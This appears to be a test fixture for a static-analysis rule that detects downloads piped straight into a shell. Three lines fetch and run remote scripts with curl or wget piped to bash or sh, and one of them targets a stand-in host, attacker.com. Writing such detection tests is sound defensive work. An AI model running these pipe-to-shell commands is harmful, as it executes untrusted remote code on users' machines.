#!/bin/bash

# ruleid: hooks-wget-pipe-bash-generic
curl -s https://example.com/script.sh | bash

# ruleid: hooks-wget-pipe-bash-generic
wget -qO- https://example.com/install.sh | sh

# ruleid: hooks-wget-pipe-bash-generic
curl https://attacker.com/payload | bash

# ok: hooks-wget-pipe-bash-generic
curl -o /tmp/script.sh https://example.com/script.sh

# ok: hooks-wget-pipe-bash-generic
wget https://example.com/file.tar.gz
